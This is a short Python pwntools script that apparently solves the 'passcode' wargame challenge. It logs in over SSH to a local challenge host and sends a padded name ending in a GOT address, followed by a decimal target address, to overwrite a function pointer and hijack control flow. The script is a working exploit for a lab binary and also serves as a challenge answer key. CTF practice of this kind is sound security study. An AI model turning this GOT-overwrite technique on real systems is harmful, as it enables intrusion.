#!/usr/bin/env python3
from pwn import *
#break *0x08048586
#break *0x08048604

s = ssh(host='localhost', user='passcode', password='guest', port=2020)

#p = process('./passcode')
p = s.run('./passcode')
g = cyclic_gen()


# Get Welcome banner
print(p.recvS(timeout=0.2))

# Get name prompt.
print(p.recvS(timeout=0.2))
# Send name
# 0x08048480
#804a018
p.sendline(g.get(96) + b"\x18\xa0\x04\x08")
#p.sendline(g.get(96) + b"\x80\xa0\x41\x41")

# Recv prompt.
print(p.recvS(timeout=0.2))
# 0x080485de
p.sendline(b"134514142")
p.sendline(b"asdf")

while True:
    line = p.recvS(timeout=0.2)
    if line is not None and line != '':
        print(line)

